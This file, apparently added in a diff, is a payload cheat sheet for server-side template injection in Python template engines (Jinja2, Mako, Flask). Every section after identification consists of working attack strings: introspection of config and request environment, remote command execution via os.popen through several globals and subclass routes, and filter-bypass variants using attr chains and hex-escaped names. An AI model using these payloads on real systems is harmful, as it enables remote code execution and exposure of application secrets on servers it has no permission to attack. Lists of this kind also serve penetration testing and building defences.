@@ -1,0 +1,26 @@
+# Python SSTI Payloads (Jinja2, Mako, Flask)
+
+# Identification
+{{7*7}}
+{{7*'7'}}
+${7*7}
+${{7*7}}
+
+# Discovery & Introspection
+{{config.items()}}
+{{self}}
+{{request.environ}}
+{{get_flashed_messages.__globals__}}
+{{cycler.__init__.__globals__}}
+
+# RCE (Jinja2 - Robust Versions)
+{{lipsum.__globals__['os'].popen('id').read()}}
+{{url_for.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
+# RCE via Subclasses (Dynamic Search)
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}{% endif %}{% endfor %}
+
+# Shell Bypass / Filter Bypass
+{{lipsum|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("id")|attr("read")()}}
+{{''['\x5f\x5fclass\x5f\x5f']['\x5f\x5fmro\x5f\x5f'][1]['\x5f\x5fsubclasses\x5f\x5f']()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
